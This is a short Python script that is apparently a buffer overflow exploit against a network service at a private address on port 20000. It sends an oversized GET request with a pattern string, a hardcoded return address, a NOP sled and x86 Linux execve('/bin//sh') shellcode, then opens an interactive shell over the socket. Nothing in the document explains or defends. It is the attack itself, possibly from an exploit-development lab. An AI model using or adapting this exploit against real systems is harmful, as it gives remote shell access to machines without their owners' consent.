import struct
import socket 
import telnetlib

HOST = "192.168.1.74"
PORT = 20000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

message = "GET" + " " + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiii" + struct.pack("<L", 0xbffff9d8) + "jkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz" + " HTTP/1.1" + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

s.send(message)
t = telnetlib.Telnet()
t.sock = s
t.interact()
